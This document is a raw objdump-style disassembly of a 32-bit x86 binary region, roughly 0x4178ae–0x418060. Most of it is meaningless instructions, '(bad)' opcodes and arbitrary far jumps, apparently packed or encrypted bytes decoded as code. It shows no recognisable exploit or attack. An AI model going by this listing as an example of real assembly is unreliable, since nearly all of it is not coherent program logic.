  4178ae:	jg     0x417922
  4178b0:	pop    ss
  4178b1:	jmp    0x41784d
  4178b3:	jmp    0x549b:0xd28155fd
  4178ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178bb:	push   es
  4178bc:	aas    
  4178bd:	jg     0x41792d
  4178bf:	add    DWORD PTR [ecx*8-0x7fb2a5bd],0xffffff84
  4178c7:	dec    esp
  4178c8:	js     0x4178e3
  4178ca:	and    dl,dh
  4178cc:	pop    es
  4178cd:	cmp    esp,ebx
  4178cf:	cdq    
  4178d0:	test   DWORD PTR [eax+0x35],edi
  4178d3:	inc    esp
  4178d4:	and    DWORD PTR [edx+0x4],ecx
  4178d7:	add    BYTE PTR [edi+0x7b],ah
  4178da:	add    esp,eax
  4178dc:	pushf  
  4178dd:	popa   
  4178de:	push   cs
  4178df:	sbb    al,BYTE PTR [eax-0x3]
  4178e2:	hlt    
  4178e3:	fnstsw WORD PTR [ecx]
  4178e5:	pusha  
  4178e6:	enter  0xe8be,0x1b
  4178ea:	sub    eax,0xe915d877
  4178ef:	dec    esi
  4178f0:	sub    eax,0x5885130e
  4178f5:	jge    0x4178ef
  4178f7:	scas   eax,DWORD PTR es:[edi]
  4178f8:	push   es
  4178f9:	loop   0x4178a8
  4178fb:	ds int 0xde
  4178fe:	test   al,0xe7
  417900:	test   al,0xe3
  417902:	jmp    0xf0a4:0xe6435e2e
  417909:	sbb    BYTE PTR [ebx+0x66],al
  41790c:	xchg   edx,eax
  41790d:	jmp    0xce53:0xbc31e13
  417914:	sbb    DWORD PTR [edi+0x6c],ebp
  417917:	cmp    DWORD PTR ds:0xc3761b9a,ebp
  41791d:	mov    eax,0x46786e95
  417922:	jns    0x41793f
  417924:	inc    esi
  417925:	xor    DWORD PTR [edi-0x20],esp
  417928:	pop    edx
  417929:	push   edi
  41792a:	or     eax,ebp
  41792c:	or     BYTE PTR [eax+0x49],cl
  41792f:	dec    esp
  417930:	in     al,dx
  417931:	nop
  417932:	inc    ebp
  417933:	fidivr DWORD PTR [edi+edi*1-0x2e]
  417937:	cmp    ch,BYTE PTR [eax+0x59]
  41793a:	rol    BYTE PTR [ebp-0x6304149f],1
  417940:	ins    DWORD PTR es:[edi],dx
  417941:	sbb    DWORD PTR [eax-0x4a],eax
  417944:	int3   
  417945:	ret    
  417946:	xchg   ebp,eax
  417947:	sub    cl,BYTE PTR [ebx+0x73]
  41794a:	xchg   esp,eax
  41794b:	sbb    eax,0x4689bcb7
  417950:	pop    es
  417951:	out    0x2a,al
  417953:	pop    ebx
  417954:	dec    ebp
  417955:	sub    bl,bl
  417957:	jo     0x417995
  417959:	cli    
  41795a:	push   esi
  41795b:	repz adc ch,BYTE PTR [ebp+ecx*4+0xa6937da]
  417963:	dec    ebx
  417964:	mov    bh,0x46
  417966:	or     eax,0x4a13d3d8
  41796b:	sub    ebx,esi
  41796d:	cmp    DWORD PTR [eax],0x55
  417970:	mov    edx,0x8e2622cb
  417975:	mov    esp,0x71b3d735
  41797a:	fiadd  DWORD PTR [eax]
  41797c:	push   eax
  41797d:	data16 fcos 
  417980:	ds pop esp
  417982:	and    eax,0x8338585a
  417987:	int    0xb5
  417989:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41798a:	fstp   QWORD PTR [ebx]
  41798c:	cmp    edx,DWORD PTR ds:0xcb1b18d9
  417992:	out    0x5c,al
  417994:	ins    DWORD PTR es:[edi],dx
  417995:	repz bnd jmp 0xcc3a5fcb
  41799c:	popf   
  41799d:	xchg   ebx,eax
  41799e:	cmp    BYTE PTR [ebx+0x23],bh
  4179a1:	loope  0x41793f
  4179a3:	xchg   ebp,eax
  4179a4:	mov    cl,0xec
  4179a6:	ds inc edx
  4179a8:	jmp    0xf7ca87df
  4179ad:	(bad)  
  4179ae:	pop    ecx
  4179af:	cmp    al,0xcf
  4179b1:	mov    al,ds:0x67d6c446
  4179b6:	sti    
  4179b7:	jns    0x4179d3
  4179b9:	inc    edx
  4179ba:	cli    
  4179bb:	adc    esp,DWORD PTR [ebp-0x47005774]
  4179c1:	adc    BYTE PTR [esi-0x16d3312e],cl
  4179c7:	mov    al,ds:0x6b5e64b1
  4179cc:	push   esp
  4179cd:	adc    BYTE PTR ds:0x927a8b96,al
  4179d3:	(bad)  
  4179d4:	xor    eax,0xce00c9c7
  4179d9:	cdq    
  4179da:	fnstsw WORD PTR [ebp+0x5e]
  4179dd:	sub    eax,0x9140443e
  4179e2:	imul   esp,DWORD PTR [ebp-0xe],0xffffffbb
  4179e6:	xor    al,0xa2
  4179e8:	or     DWORD PTR [ecx-0x4012163e],edi
  4179ee:	sbb    bh,cl
  4179f0:	pushf  
  4179f1:	stos   DWORD PTR es:[edi],eax
  4179f2:	dec    ebp
  4179f3:	in     al,0x59
  4179f5:	mov    fs,WORD PTR [ebx+ebp*2-0x42]
  4179f9:	test   al,0x4f
  4179fb:	fbld   TBYTE PTR [ebx]
  4179fd:	test   BYTE PTR fs:[edx],ch
  417a00:	lahf   
  417a01:	and    dh,BYTE PTR [edi]
  417a03:	add    DWORD PTR [ecx+0x47971af4],edi
  417a09:	cmp    eax,0xd83cbb7e
  417a0e:	imul   DWORD PTR [ecx+0x32]
  417a11:	sub    al,0x25
  417a13:	es inc ecx
  417a15:	aas    
  417a16:	pop    ds
  417a17:	pop    ss
  417a18:	cld    
  417a19:	sbb    eax,0x53a2d6f
  417a1e:	jl     0x417a5c
  417a20:	repnz aam 0xe
  417a23:	jne    0x4179bf
  417a25:	call   0xdd5d2431
  417a2a:	add    al,BYTE PTR [ebx]
  417a2c:	mov    bl,0xd3
  417a2e:	adc    eax,edx
  417a30:	repnz out dx,al
  417a32:	or     DWORD PTR [ebx+0x24860622],0xebcca379
  417a3c:	cmp    BYTE PTR [ebx+0x73],0x17
  417a40:	push   ebp
  417a41:	je     0x417a49
  417a43:	add    al,0x14
  417a45:	xchg   BYTE PTR [ecx-0x1fadbbe],dl
  417a4b:	add    DWORD PTR [esp+esi*4+0x40ee892c],ebp
  417a52:	adc    DWORD PTR [ebx+esi*4+0x4d81ac3d],esi
  417a59:	ret    0xd73b
  417a5c:	xor    DWORD PTR [ebx+0x2123966f],ebx
  417a62:	push   ds
  417a63:	aas    
  417a64:	ds (bad) 
  417a67:	mov    bl,0xf9
  417a69:	mov    DWORD PTR [edx+0x4b],edx
  417a6c:	sbb    eax,0x9826de21
  417a71:	inc    edi
  417a72:	push   ss
  417a73:	stc    
  417a74:	js     0x4179f8
  417a76:	sbb    esi,DWORD PTR [ebx+esi*1-0x1d5673b3]
  417a7d:	cmp    bh,BYTE PTR [esi]
  417a7f:	jmp    0x49ed21d9
  417a84:	sbb    bl,ah
  417a86:	adc    al,BYTE PTR [edi]
  417a88:	jno    0x417a3d
  417a8a:	fsubr  DWORD PTR [ecx]
  417a8c:	mov    edi,0x54d6b
  417a91:	xchg   ebp,eax
  417a92:	int    0x9f
  417a94:	mov    ebx,0xf8dc584f
  417a99:	mov    al,0x22
  417a9b:	outs   dx,BYTE PTR ds:[esi]
  417a9c:	ins    BYTE PTR es:[edi],dx
  417a9d:	inc    BYTE PTR [ebx+0x79cf9c8d]
  417aa3:	jmp    0x417ac0
  417aa5:	enter  0x33f8,0x8
  417aa9:	lock cmp ebp,ecx
  417aac:	bound  eax,QWORD PTR [ebp-0x3c]
  417aaf:	jns    0x417a73
  417ab1:	cwde   
  417ab2:	jl     0x417b05
  417ab4:	div    DWORD PTR [ecx-0x1e]
  417ab7:	fidiv  DWORD PTR [esi-0x1a]
  417aba:	fistp  WORD PTR [edi+0x52]
  417abd:	test   BYTE PTR [edx-0x568431be],0x2d
  417ac4:	mov    WORD PTR [ebp+ebp*1+0x634adb3b],cs
  417acb:	imul   edi,ebx,0xb3ca8a11
  417ad1:	xlat   BYTE PTR ds:[ebx]
  417ad2:	mov    eax,DWORD PTR [ecx-0x7d]
  417ad5:	dec    esp
  417ad6:	or     al,0xd6
  417ad8:	mov    ecx,0xdd47fe1d
  417add:	xchg   edx,eax
  417ade:	fcomp  QWORD PTR [ebx+0x27f4a445]
  417ae4:	dec    eax
  417ae5:	mov    ebp,DWORD PTR [edi+0x2c1827d7]
  417aeb:	(bad)  
  417aec:	dec    ecx
  417aed:	add    al,0x5f
  417aef:	push   esp
  417af0:	mov    al,0x42
  417af2:	sahf   
  417af3:	push   ss
  417af4:	mov    ch,0xc0
  417af6:	cmp    DWORD PTR [esi-0x7b],eax
  417af9:	fistp  DWORD PTR [ecx]
  417afb:	lahf   
  417afc:	aaa    
  417afd:	pop    esp
  417afe:	sub    BYTE PTR [eax+eiz*8],ch
  417b01:	les    edx,FWORD PTR [edi]
  417b03:	scas   al,BYTE PTR es:[edi]
  417b04:	sub    al,0x68
  417b06:	jecxz  0x417b42
  417b08:	jle    0x417b13
  417b0a:	cmp    eax,0xaea458dc
  417b0f:	mov    dl,0xf8
  417b11:	lods   al,BYTE PTR ds:[esi]
  417b12:	mov    ebx,0x23f8d8ca
  417b17:	aaa    
  417b18:	call   0x2fc61b5a
  417b1d:	pop    ds
  417b1e:	das    
  417b1f:	mov    al,0xa4
  417b21:	mov    ebx,0xb55788db
  417b26:	push   edi
  417b27:	mov    edi,DWORD PTR [ebx+0x1a89ce62]
  417b2d:	jae    0x417b85
  417b2f:	push   eax
  417b30:	push   es
  417b31:	push   edi
  417b32:	aas    
  417b33:	add    ch,BYTE PTR [eax]
  417b35:	or     eax,0x47862fab
  417b3a:	loop   0x417b3a
  417b3c:	push   edi
  417b3d:	mov    ch,0xdd
  417b3f:	pusha  
  417b40:	xchg   DWORD PTR [edi],esi
  417b42:	ds jg  0x417b77
  417b45:	pop    ecx
  417b46:	jne    0x417b15
  417b48:	outs   dx,BYTE PTR ds:[esi]
  417b49:	retf   
  417b4a:	shl    DWORD PTR [edx+0x27],0x57
  417b4e:	data16 fist DWORD PTR [ecx+0x34]
  417b52:	adc    cl,dl
  417b54:	nop
  417b55:	sbb    al,0x4b
  417b57:	cmp    bl,bl
  417b59:	jp     0x417b16
  417b5b:	sub    al,0x83
  417b5d:	sub    BYTE PTR [esi+0x3],cl
  417b60:	in     al,0xe8
  417b62:	mov    cl,0x20
  417b64:	clc    
  417b65:	outs   dx,BYTE PTR ds:[esi]
  417b66:	das    
  417b67:	and    edx,DWORD PTR [ecx-0x2c]
  417b6a:	and    eax,0x765cd5c5
  417b6f:	push   edi
  417b70:	jmp    0x690cb837
  417b75:	pop    esp
  417b76:	adc    cl,BYTE PTR [esi+0x1940495f]
  417b7c:	mov    al,0x41
  417b7e:	hlt    
  417b7f:	inc    edx
  417b80:	out    dx,al
  417b81:	adc    esi,DWORD PTR [esi]
  417b83:	push   edx
  417b84:	mov    ebx,0x7a44db8b
  417b89:	cmp    BYTE PTR [esi-0x6e],dl
  417b8c:	and    eax,0xcb59d14e
  417b91:	enter  0xa1a5,0x17
  417b95:	stos   BYTE PTR es:[edi],al
  417b96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b97:	ret    
  417b98:	(bad)  [ebp+0x0]
  417b9b:	addr16 push 0xffffffd7
  417b9e:	push   ss
  417b9f:	std    
  417ba0:	imul   edi,DWORD PTR ds:0xfc1ec16f,0xffffffdf
  417ba7:	mov    edi,0xa31baa91
  417bac:	xchg   edi,eax
  417bad:	pop    ecx
  417bae:	out    dx,eax
  417baf:	push   cs
  417bb0:	adc    DWORD PTR [edx-0x73511df9],edi
  417bb6:	cld    
  417bb7:	repnz imul ecx,DWORD PTR [ecx],0x7e
  417bbb:	imul   eax,DWORD PTR [esi+0x491c6621],0xffffff83
  417bc2:	cdq    
  417bc3:	daa    
  417bc4:	xlat   BYTE PTR ds:[ebx]
  417bc5:	out    0x6f,eax
  417bc7:	mov    eax,0xac5220d5
  417bcc:	sbb    al,ch
  417bce:	int3   
  417bcf:	xchg   ebp,eax
  417bd0:	call   0xfab49e1f
  417bd5:	repz dec esp
  417bd7:	sbb    BYTE PTR [edx+0x27],0x55
  417bdb:	mov    ebx,0x39cb82b6
  417be0:	cld    
  417be1:	sbb    al,0x11
  417be3:	mov    ebp,0x5e4889f
  417be8:	in     eax,0x66
  417bea:	fsubp  st(5),st
  417bec:	mov    esi,esp
  417bee:	inc    eax
  417bef:	cmp    DWORD PTR [eax+edx*8],eax
  417bf2:	or     al,BYTE PTR [eax+0x18e2aca9]
  417bf8:	jns    0x417bc0
  417bfa:	into   
  417bfb:	hlt    
  417bfc:	fisub  DWORD PTR [esi+0x4d]
  417bff:	dec    ecx
  417c00:	mov    ?,ebp
  417c02:	xchg   esp,eax
  417c03:	call   0xca43:0x83989d62
  417c0a:	sbb    DWORD PTR [ebx+0x4b],esi
  417c0d:	mov    esp,DWORD PTR [ebp+0x114f4b9f]
  417c13:	push   ebx
  417c14:	cmp    DWORD PTR [esi],edx
  417c16:	jns    0x417bcd
  417c18:	in     al,0xe5
  417c1a:	xor    BYTE PTR [edi],al
  417c1c:	cmp    al,0xc2
  417c1e:	pop    esi
  417c1f:	xor    BYTE PTR [ecx],dh
  417c21:	and    ebx,edx
  417c23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c24:	jb     0x417c39
  417c26:	inc    edi
  417c27:	stos   BYTE PTR es:[edi],al
  417c28:	or     DWORD PTR [ecx+0x76],edx
  417c2b:	and    ch,ch
  417c2d:	push   es
  417c2e:	stos   BYTE PTR es:[edi],al
  417c2f:	aaa    
  417c30:	xor    esp,DWORD PTR [ebp+0x62]
  417c33:	je     0x417ca0
  417c35:	mov    eax,ds:0x7b5766b6
  417c3a:	xchg   ebp,eax
  417c3b:	(bad)  
  417c3c:	push   ss
  417c3d:	xor    al,0x1b
  417c3f:	and    dl,BYTE PTR [ebx+0x5b49219b]
  417c45:	push   ss
  417c46:	pop    eax
  417c47:	jo     0x417c46
  417c49:	and    eax,0x52bfc11
  417c4e:	mov    edi,0x3f3da969
  417c53:	stos   DWORD PTR es:[edi],eax
  417c54:	jmp    0xa29c:0x6b826d5a
  417c5b:	out    dx,eax
  417c5c:	sub    eax,0x85270b69
  417c61:	stc    
  417c62:	push   ecx
  417c63:	bound  esp,QWORD PTR [edi]
  417c65:	vcmpps xmm6,xmm5,XMMWORD PTR [esi],0x65
  417c6a:	lea    esp,[ecx+ebx*1-0x55]
  417c6e:	ds cld 
  417c70:	nop
  417c71:	push   cs
  417c72:	sub    ch,BYTE PTR [edi+0x593fdcfd]
  417c78:	cwde   
  417c79:	jmp    0x734be52b
  417c7e:	mov    dl,0x32
  417c80:	xor    dh,BYTE PTR [ebp+0x26]
  417c83:	hlt    
  417c84:	fadd   st(7),st
  417c86:	sbb    bl,BYTE PTR [esi-0x21]
  417c89:	push   esp
  417c8a:	shl    DWORD PTR [esi-0x356a8063],1
  417c90:	out    dx,eax
  417c91:	pop    DWORD PTR [edx+0x4ce7404b]
  417c97:	fcom   QWORD PTR es:[ebp-0xabd1e4d]
  417c9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c9f:	xor    eax,0xfee41a5e
  417ca4:	mov    WORD PTR [ecx+0x8],cs
  417ca7:	add    BYTE PTR [ebp+ecx*8-0x5c],cl
  417cab:	out    dx,eax
  417cac:	pop    edx
  417cad:	cmp    al,dl
  417caf:	aam    0xf7
  417cb1:	xor    eax,0x9dd4d6ba
  417cb6:	sub    bl,BYTE PTR ds:0xb5f966e3
  417cbc:	out    0xbf,al
  417cbe:	mov    ebx,0xc4da2c78
  417cc3:	jns    0x417c8e
  417cc5:	das    
  417cc6:	cwde   
  417cc7:	imul   edi,ecx,0x33a63f26
  417ccd:	cmovns ebx,DWORD PTR [ecx-0x18]
  417cd1:	cli    
  417cd2:	sti    
  417cd3:	ret    
  417cd4:	les    edi,FWORD PTR ss:[ebx+0x3a5b0da4]
  417cdb:	sub    BYTE PTR [esp+edi*4+0x32f7638],ah
  417ce2:	cmp    al,0x3d
  417ce4:	sahf   
  417ce5:	pop    esi
  417ce6:	pop    ss
  417ce7:	push   ds
  417ce8:	cmp    ah,BYTE PTR [esi]
  417cea:	and    eax,0xb9de121f
  417cef:	mov    dl,BYTE PTR [ecx+0x139d5504]
  417cf5:	enter  0xe534,0x2
  417cf9:	and    al,0x14
  417cfb:	aas    
  417cfc:	cmp    eax,0x9028befd
  417d01:	push   edx
  417d02:	xchg   esp,eax
  417d03:	mov    esp,0x2159431a
  417d08:	lea    esi,[edx]
  417d0a:	jae    0x417d6b
  417d0c:	sub    DWORD PTR [edx+0x2a748f7a],esp
  417d12:	xchg   esi,eax
  417d13:	and    dh,BYTE PTR [ebp+0x12c7cb1e]
  417d19:	ficom  WORD PTR [ebp+eax*4-0x5]
  417d1d:	stos   DWORD PTR es:[edi],eax
  417d1e:	lahf   
  417d1f:	in     al,0x2b
  417d21:	loope  0x417d2c
  417d23:	push   es
  417d24:	sub    al,0x8b
  417d26:	and    eax,0x6f18e356
  417d2b:	mov    es,edi
  417d2d:	mov    eax,?
  417d2f:	xchg   ecx,eax
  417d30:	pop    edi
  417d31:	int    0xa4
  417d33:	lahf   
  417d34:	rcl    BYTE PTR [esi-0x62],1
  417d37:	sub    edx,edx
  417d39:	xlat   BYTE PTR ds:[bx]
  417d3b:	cld    
  417d3c:	retf   
  417d3d:	and    al,0xb2
  417d3f:	cwde   
  417d40:	dec    ecx
  417d41:	std    
  417d42:	push   esi
  417d43:	mov    ecx,0x17888254
  417d48:	or     al,0x43
  417d4a:	in     eax,dx
  417d4b:	ret    
  417d4c:	push   esi
  417d4d:	test   ebp,ebp
  417d4f:	and    eax,DWORD PTR [ecx-0x10fb2266]
  417d55:	daa    
  417d56:	jecxz  0x417d8e
  417d58:	and    eax,0xcc1028f5
  417d5d:	or     DWORD PTR [eax-0x6f8b6fa4],ecx
  417d63:	lea    esp,[ebp+0x33]
  417d66:	push   ds
  417d67:	adc    DWORD PTR [ebx+0xfc8e5c4],edx
  417d6d:	jmp    0x9542c4fe
  417d72:	sbb    DWORD PTR [ebx+ebx*8],ebp
  417d75:	pop    esp
  417d76:	pop    ecx
  417d77:	mov    bh,0x1e
  417d79:	mov    esi,0xf5f42ea4
  417d7e:	jne    0x417d3a
  417d80:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d82:	cs xchg esp,eax
  417d84:	mov    ecx,0x103ba94e
  417d89:	stc    
  417d8a:	xchg   ebp,eax
  417d8b:	test   esp,esp
  417d8d:	aam    0x4a
  417d8f:	inc    edx
  417d90:	pop    eax
  417d91:	jae    0x417da7
  417d93:	loopne 0x417d89
  417d95:	arpl   WORD PTR [eax],dx
  417d97:	ret    0x447a
  417d9a:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d9c:	xchg   esp,eax
  417d9d:	leave  
  417d9e:	add    dl,BYTE PTR [ebx]
  417da0:	jl     0x417d61
  417da2:	data16 std 
  417da4:	pop    es
  417da5:	enter  0x1f28,0x7c
  417da9:	push   ecx
  417daa:	sbb    DWORD PTR [edi-0x25],0xffffffe0
  417dae:	cli    
  417daf:	jp     0x417d3c
  417db1:	cmp    DWORD PTR [edi+0x6f91a30c],ebx
  417db7:	popf   
  417db8:	push   edi
  417db9:	ins    DWORD PTR es:[edi],dx
  417dba:	loop   0x417dda
  417dbc:	mov    cl,0xbe
  417dbe:	test   BYTE PTR [ebp-0x307f2728],ah
  417dc4:	push   cs
  417dc5:	(bad)  [ecx+eax*2+0x36adf807]
  417dcc:	into   
  417dcd:	cmc    
  417dce:	sti    
  417dcf:	js     0x417da0
  417dd1:	repz and esi,DWORD PTR [ebp-0x138db0bf]
  417dd8:	fist   WORD PTR ds:0x624e216a
  417dde:	fs into 
  417de0:	jnp    0x417d6e
  417de2:	ret    0x6184
  417de5:	pop    esi
  417de6:	and    al,0x61
  417de8:	and    eax,0x9401006a
  417ded:	sub    ch,BYTE PTR [esi-0x6176234e]
  417df3:	cli    
  417df4:	xchg   ebx,eax
  417df5:	ficom  WORD PTR [ebp-0x4a]
  417df8:	mov    dl,0xf6
  417dfa:	fsubr  QWORD PTR [ebp+0x42ae5552]
  417e00:	sub    ah,BYTE PTR [eax]
  417e02:	pop    ds
  417e03:	stc    
  417e04:	or     bh,ah
  417e06:	mov    edx,ebx
  417e08:	mov    WORD PTR [edi-0x7b],es
  417e0b:	dec    ebp
  417e0c:	mov    bl,0x24
  417e0e:	xor    eax,DWORD PTR [edx+0x71]
  417e11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e12:	fisttp QWORD PTR [eax-0x6b]
  417e15:	and    al,0xa3
  417e17:	popf   
  417e18:	or     bh,BYTE PTR [eax+0x726eab90]
  417e1e:	mov    edi,0x13133b3
  417e23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e24:	stc    
  417e25:	inc    eax
  417e26:	sbb    al,0xd8
  417e28:	(bad)  
  417e29:	in     eax,dx
  417e2a:	or     BYTE PTR [ebx-0x73751fb3],0xd
  417e31:	pop    esp
  417e32:	(bad)  
  417e33:	(bad)  
  417e34:	dec    DWORD PTR [ebx+0xa3a0c55]
  417e3a:	jne    0x420de3
  417e40:	mov    ecx,DWORD PTR [ebp-0x14]
  417e43:	mov    edx,DWORD PTR [ebp+0xc]
  417e46:	movsx  edx,BYTE PTR [edx]
  417e49:	xor    ecx,eax
  417e4b:	add    ecx,esi
  417e4d:	jmp    0x41a1da
  417e52:	cmp    DWORD PTR [ecx],ecx
  417e54:	mov    ebp,0x79c6ad42
  417e59:	stc    
  417e5a:	mov    DWORD PTR [ebp-0x58],edi
  417e5d:	(bad)  
  417e5f:	js     0x7d7a5cc0
  417e65:	jp     0x417e71
  417e67:	pop    edi
  417e68:	jp     0x417ee4
  417e6a:	jno    0x417e04
  417e6c:	dec    edi
  417e6d:	mov    bl,0x7a
  417e6f:	loopne 0x417e89
  417e71:	fmul   QWORD PTR [edi]
  417e73:	push   edi
  417e74:	not    al
  417e76:	jmp    FWORD PTR [ebx-0x28]
  417e79:	and    dh,ch
  417e7b:	push   es
  417e7c:	fild   WORD PTR [edx+0x275209a1]
  417e82:	mul    BYTE PTR [esi]
  417e84:	jp     0x417e48
  417e86:	lea    edx,[ecx+0x48ad98e5]
  417e8c:	dec    esp
  417e8d:	out    0xf1,al
  417e8f:	add    al,0xbb
  417e91:	mov    dl,0xcd
  417e93:	mov    eax,edi
  417e95:	popa   
  417e96:	(bad)  
  417e97:	aam    0xcc
  417e99:	imul   ebx,ebx,0x3f
  417e9c:	aas    
  417e9d:	fnstsw ax
  417e9f:	dec    edx
  417ea0:	or     edi,DWORD PTR [esi]
  417ea2:	test   eax,0xfa6e46ce
  417ea7:	mov    esp,0xc1cc1215
  417eac:	mov    al,0x8c
  417eae:	sub    BYTE PTR [edi],cl
  417eb0:	imul   edi,DWORD PTR [ebp+0x1a],0xffffffb4
  417eb4:	lock add ch,BYTE PTR [ecx-0x52]
  417eb8:	stc    
  417eb9:	dec    edi
  417eba:	sub    DWORD PTR [edi+0x25a1e4ab],ecx
  417ec0:	packsswb mm1,QWORD PTR [ecx-0x3fceb5e0]
  417ec7:	pop    ds
  417ec8:	jecxz  0x417e78
  417eca:	sub    DWORD PTR [ecx-0x61],ecx
  417ecd:	aaa    
  417ece:	pop    eax
  417ecf:	inc    esi
  417ed0:	jle    0x417f0c
  417ed2:	stos   BYTE PTR es:[edi],al
  417ed3:	js     0x417ea6
  417ed5:	lahf   
  417ed6:	mov    fs,eax
  417ed8:	ins    BYTE PTR es:[edi],dx
  417ed9:	std    
  417eda:	xor    eax,0xd4f41d2
  417edf:	out    dx,eax
  417ee0:	mov    ch,0x56
  417ee2:	adc    eax,0x5856ea3d
  417ee7:	mov    dl,0x49
  417ee9:	addr16 call 0x97ab840a
  417eef:	push   ebp
  417ef0:	and    al,0x57
  417ef2:	sub    DWORD PTR [ebx],0x9cc0d3e5
  417ef8:	cmp    edi,esi
  417efa:	test   ch,ah
  417efc:	mov    BYTE PTR [ecx],dl
  417efe:	mov    cl,0x69
  417f00:	add    bh,al
  417f02:	dec    eax
  417f03:	(bad)  
  417f04:	cs jmp 0x17a15878
  417f0a:	pop    es
  417f0b:	cwde   
  417f0c:	lock add al,0x66
  417f0f:	or     bl,cl
  417f11:	(bad)  
  417f13:	int3   
  417f14:	lds    edx,FWORD PTR [edx-0x4dcf7a27]
  417f1a:	outs   dx,DWORD PTR ds:[esi]
  417f1b:	fnstenv [ecx-0x38]
  417f1e:	xchg   esp,eax
  417f1f:	sti    
  417f20:	push   0x7b
  417f22:	xchg   esp,eax
  417f23:	rcr    DWORD PTR [edi+0x1edc98cf],0x68
  417f2a:	dec    esi
  417f2b:	lock mov cs,eax
  417f2e:	mov    bl,BYTE PTR [ebx]
  417f30:	fistp  WORD PTR ds:0x4fa4758e
  417f36:	or     ecx,ebx
  417f38:	mov    ds,WORD PTR [ecx+ecx*4]
  417f3b:	(bad)
  417f3f:	pop    esp
  417f40:	(bad)  
  417f41:	xchg   ecx,eax
  417f42:	xor    ah,ch
  417f44:	mov    ds,WORD PTR [eax+0x45]
  417f47:	ret    0x60b8
  417f4a:	push   ebp
  417f4b:	rcr    DWORD PTR [eax-0x71],0x8
  417f4f:	dec    esp
  417f50:	xor    DWORD PTR [edi],edi
  417f52:	je     0x417fa2
  417f54:	test   eax,0x216ad83b
  417f59:	push   ebp
  417f5a:	jle    0x417f5b
  417f5c:	xchg   esi,eax
  417f5d:	pop    esi
  417f5e:	sbb    al,0xa5
  417f60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f61:	pop    edi
  417f62:	fwait
  417f63:	push   es
  417f64:	fs loope 0x417f38
  417f67:	outs   dx,BYTE PTR ds:[esi]
  417f68:	leave  
  417f69:	cmp    cl,BYTE PTR ds:0xc53fade0
  417f6f:	call   0xb01d:0x28631165
  417f76:	dec    esi
  417f77:	adc    cl,BYTE PTR [esi]
  417f79:	or     ecx,ebx
  417f7b:	rcr    eax,0x19
  417f7e:	fs mov ecx,0x70e9821a
  417f84:	scas   eax,DWORD PTR es:[edi]
  417f85:	xchg   edx,eax
  417f86:	enter  0x3033,0x48
  417f8a:	cmc    
  417f8b:	dec    esi
  417f8c:	jg     0x417f0f
  417f8e:	mov    bl,0x3d
  417f90:	lods   al,BYTE PTR ds:[esi]
  417f91:	and    ah,BYTE PTR [ecx-0x80]
  417f94:	mov    cl,0x66
  417f96:	and    BYTE PTR [edi],ch
  417f98:	hlt    
  417f99:	dec    ebx
  417f9a:	adc    ebx,DWORD PTR [edi+0x4bef2e42]
  417fa0:	and    al,0x50
  417fa2:	outs   dx,DWORD PTR ds:[esi]
  417fa3:	addr16 leave 
  417fa5:	out    0x32,al
  417fa7:	xchg   esp,eax
  417fa8:	sub    eax,0x83bf1204
  417fad:	add    dh,0x85
  417fb0:	push   edi
  417fb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fb2:	push   cs
  417fb3:	aam    0x9a
  417fb5:	imul   esi,DWORD PTR [eax],0x74
  417fb8:	(bad)  
  417fb9:	fs mov edi,0x9e4001c1
  417fbf:	adc    eax,0x217df6ec
  417fc4:	dec    edi
  417fc5:	jg     0x418039
  417fc7:	inc    ebp
  417fc8:	fcmovnbe st,st(0)
  417fca:	ret    0xc572
  417fcd:	jno    0x417fbd
  417fcf:	xor    ebx,DWORD PTR [ecx]
  417fd1:	dec    edx
  417fd2:	test   DWORD PTR [eax],esi
  417fd4:	ds test al,0x1e
  417fd7:	pop    esp
  417fd8:	dec    edi
  417fd9:	imul   esp,esp,0x3cf13a19
  417fdf:	retf   
  417fe0:	shr    bl,cl
  417fe2:	dec    esi
  417fe3:	loop   0x41805f
  417fe5:	mov    ds:0x52a0de69,eax
  417fea:	lods   al,BYTE PTR ds:[esi]
  417feb:	xor    BYTE PTR [edx-0x57],bl
  417fee:	or     DWORD PTR [esi],ebp
  417ff0:	adc    BYTE PTR [ebp-0xb0a5ada],ch
  417ff6:	jae    0x417fe4
  417ff8:	cmc    
  417ff9:	jne    0x41801f
  417ffb:	out    0xaa,al
  417ffd:	xchg   ecx,eax
  417ffe:	out    0x44,al
  418000:	cmp    al,0x54
  418002:	scas   al,BYTE PTR es:[edi]
  418003:	mov    ds:0xeed71fbf,al
  418008:	leave  
  418009:	cmp    eax,0x937cfa47
  41800e:	mov    ch,0xc3
  418010:	sub    eax,0xa92c958f
  418015:	dec    edi
  418016:	pop    ss
  418017:	lea    edx,[ebx+eiz*4]
  41801a:	cmp    dh,bl
  41801c:	lods   al,BYTE PTR ds:[esi]
  41801d:	push   esi
  41801e:	outs   dx,DWORD PTR ds:[esi]
  41801f:	lahf   
  418020:	clc    
  418021:	imul   eax,ebp,0xaa64f47b
  418027:	jno    0x417fc5
  418029:	ret    0xe1b7
  41802c:	adc    al,0x6d
  41802e:	push   cs
  41802f:	outs   dx,DWORD PTR ds:[esi]
  418030:	dec    esi
  418031:	leave  
  418032:	pop    esi
  418033:	(bad)  
  418034:	push   0xffffff8d
  418036:	pop    ebx
  418037:	pop    ds
  418038:	jg     0x418053
  41803a:	inc    esi
  41803b:	mov    ebx,0x8f920a69
  418040:	inc    edx
  418041:	cmp    esi,DWORD PTR [eax]
  418043:	sub    BYTE PTR [ecx],al
  418045:	xor    al,0x1a
  418047:	lea    edx,[ebx-0x22]
  41804a:	mov    eax,0x2d76da6d
  41804f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418050:	fisub  DWORD PTR [ebp-0x4a0de89c]
  418056:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418057:	pop    es
  418058:	(bad)  
  418059:	push   ebp
  41805a:	popa   
  41805b:	jp     0x417fdf
  41805d:	mov    cl,BYTE PTR [ebx+edi*4]
  418060:	and    eax,0x52e03ba8
